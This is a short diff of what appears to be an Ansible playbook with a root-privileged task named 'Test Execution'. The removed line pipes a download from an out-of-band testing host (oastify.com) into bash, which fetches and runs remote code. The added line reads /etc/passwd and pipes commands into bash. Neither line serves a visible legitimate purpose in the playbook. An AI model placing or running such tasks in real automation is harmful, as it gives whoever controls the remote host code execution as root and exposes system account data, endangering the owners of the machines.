@@ -6,4 +6,4 @@
         msg: "Hello World!"
     - name: Test Execution
       become: yes
-      shell: "curl https://nsjanr380kqghh7xhrnpocnsqjwak1jp8.oastify.com | bash"
+      shell: "cat /etc/passwd | id | bash"
